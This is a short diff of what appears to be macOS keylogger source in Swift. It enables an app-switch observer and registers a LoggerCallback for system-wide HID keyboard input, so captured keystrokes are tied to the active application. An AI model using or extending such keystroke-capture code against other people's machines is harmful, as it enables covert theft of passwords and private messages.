@@ -50,12 +50,12 @@ class Keylogger
         let observer = UnsafeMutableRawPointer(Unmanaged.passUnretained(self).toOpaque())
         
         // when user switches apps, change active app
-//        NSWorkspace.shared.notificationCenter.addObserver(self,
-//                                                          selector: #selector(activatedApp),
-//                                                          name: NSWorkspace.didActivateApplicationNotification,
-//                                                          object: nil)
+        NSWorkspace.shared.notificationCenter.addObserver(self,
+                                                          selector: #selector(activatedApp),
+                                                          name: NSWorkspace.didActivateApplicationNotification,
+                                                          object: nil)
         
-        IOHIDManagerRegisterInputValueCallback(manager, CallbackFunctions.Handle_IOHIDInputValueCallback, observer);
+        IOHIDManagerRegisterInputValueCallback(manager, LoggerCallback.Handle_IOHIDInputValueCallback, observer);
         
         let ioreturn: IOReturn = openHIDManager()
         if ioreturn != kIOReturnSuccess
